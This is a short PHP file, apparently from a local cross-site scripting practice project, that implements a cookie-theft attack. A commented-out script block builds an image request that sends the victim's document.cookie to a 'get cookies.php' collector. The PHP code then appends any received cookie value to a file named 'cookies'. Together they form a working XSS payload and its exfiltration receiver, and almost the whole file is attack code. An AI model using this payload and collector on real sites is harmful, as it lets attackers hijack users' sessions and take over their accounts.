<!--<script>-->
<!--    var img = document.createElement("img");-->
<!--    img.src = "C:/xampp/htdocs/phpStorm/securiy/XSS/hacker/get%20cookies.php?cookie=" %2B document.cookie;-->
<!--</script>-->
<?php
/**
 * Created by PhpStorm.
 * User: MOGA
 * Date: 2017-06-15
 * Time: 3:29 PM
 */
if (isset($_GET['cookie'])) {
    file_put_contents("cookies", $_GET['cookie'] . "\n", FILE_APPEND);
}